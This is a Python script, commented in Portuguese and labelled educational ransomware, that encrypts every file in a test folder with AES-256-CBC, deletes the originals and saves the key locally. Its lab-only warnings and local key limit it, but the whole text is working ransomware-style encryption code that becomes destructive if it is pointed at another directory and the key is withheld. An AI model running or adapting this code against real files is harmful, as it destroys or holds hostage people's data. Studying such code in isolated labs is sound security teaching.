#!/usr/bin/env python3
"""
Ransomware Educacional - Encrypter
Criptografa arquivos em uma pasta de teste usando AES (modo CBC).
Gera uma chave aleatória e a salva em um arquivo (key.key) para posterior descriptografia.
ATENÇÃO: Use APENAS em laboratório isolado.
"""

import os
import sys
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import secrets

# Configuração da pasta alvo (use um diretório de TESTE)
TARGET_DIR = "./test_files"   # Crie esta pasta com alguns arquivos .txt, .png, etc.
KEY_FILE = "key.key"

def generate_key():
    """Gera uma chave AES-256 aleatória (32 bytes)"""
    return secrets.token_bytes(32)

def save_key(key, filename):
    """Salva a chave em um arquivo (quem descriptografa precisa dela)"""
    with open(filename, "wb") as f:
        f.write(key)

def load_key(filename):
    """Carrega a chave do arquivo"""
    with open(filename, "rb") as f:
        return f.read()

def encrypt_file(file_path, key):
    """
    Criptografa um arquivo usando AES-256-CBC.
    O IV é gerado aleatoriamente e salvo junto com o arquivo criptografado.
    """
    # Gera um IV aleatório (16 bytes para AES)
    iv = secrets.token_bytes(16)

    # Lê o conteúdo do arquivo original
    with open(file_path, "rb") as f:
        plaintext = f.read()

    # Aplica padding PKCS7 para alinhar ao tamanho do bloco (16 bytes)
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(plaintext) + padder.finalize()

    # Configura o cipher AES-256-CBC
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(padded_data) + encryptor.finalize()

    # Salva o arquivo criptografado: IV + ciphertext
    encrypted_path = file_path + ".encrypted"
    with open(encrypted_path, "wb") as f:
        f.write(iv + ciphertext)

    # Remove o arquivo original (simula o comportamento de ransomware)
    os.remove(file_path)

def main():
    if not os.path.exists(TARGET_DIR):
        print(f"[ERRO] A pasta {TARGET_DIR} não existe. Crie-a e coloque alguns arquivos de teste.")
        sys.exit(1)

    # Gera a chave e salva
    key = generate_key()
    save_key(key, KEY_FILE)
    print(f"[+] Chave gerada e salva em {KEY_FILE} (guarde com segurança!)")

    # Percorre todos os arquivos da pasta alvo (não recursivo por simplicidade)
    for filename in os.listdir(TARGET_DIR):
        file_path = os.path.join(TARGET_DIR, filename)
        if os.path.isfile(file_path) and not filename.endswith(".encrypted"):
            print(f"[+] Criptografando: {filename}")
            encrypt_file(file_path, key)

    print("[+] Todos os arquivos foram criptografados. Use o decrypter.py para restaurar.")
    print("[!] Lembre-se: isso é apenas para estudo. Nunca use em sistemas reais.")

if __name__ == "__main__":
    main()